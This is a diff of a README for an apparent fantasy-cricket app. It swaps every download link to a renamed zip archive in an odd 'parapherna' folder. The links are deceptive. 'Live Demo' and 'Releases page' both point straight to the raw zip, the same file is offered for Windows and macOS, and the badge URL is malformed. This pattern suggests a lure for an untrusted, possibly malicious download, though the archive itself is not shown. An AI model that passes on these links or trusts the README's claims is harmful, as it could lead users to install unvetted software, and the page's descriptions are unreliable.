@@ -1,9 +1,9 @@
 # 🏏 Fantasy-Cricket-Team-Builder - Build Your Dream Cricket Team Easily
 
-[![Download](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip%20Now-%https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip)](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip)
+[![Download](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip%20Now-%https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip)](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip)
 
 ## 🌐 Live Demo
-Check out a live version of the app here: [Live Demo](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip)
+Check out a live version of the app here: [Live Demo](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip)
 
 -----
 
@@ -25,13 +25,13 @@ This project offers several features to ensure a smooth experience:
 Follow these simple steps to set up the application on your computer.
 
 ### 1. Download the Application
-To download the application, visit the Releases page: [Download Here](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip).
+To download the application, visit the Releases page: [Download Here](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip).
 
 ### 2. Choose Your File
 On the Releases page, you will find multiple versions of the application. Select the file suitable for your operating system. You might see options like:
 
-- Windows: https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip
-- macOS: https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip
+- Windows: https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip
+- macOS: https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip
 
 ### 3. Unzip the File
 After downloading, locate the file in your Downloads folder. Right-click the downloaded zip file and select "Extract All" or a similar option based on your operating system.
@@ -98,4 +98,4 @@ Feel free to dive deeper into each of these subjects to enhance your understandi
 
 -----
 
-Visit the Releases page to download the application now: [Download Here](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Fantasy-Cricket-Team-Builder.zip). Enjoy building your fantasy cricket team!
+Visit the Releases page to download the application now: [Download Here](https://raw.githubusercontent.com/kokey1234/Fantasy-Cricket-Team-Builder/main/parapherna/Team-Fantasy-Builder-Cricket-1.3.zip). Enjoy building your fantasy cricket team!
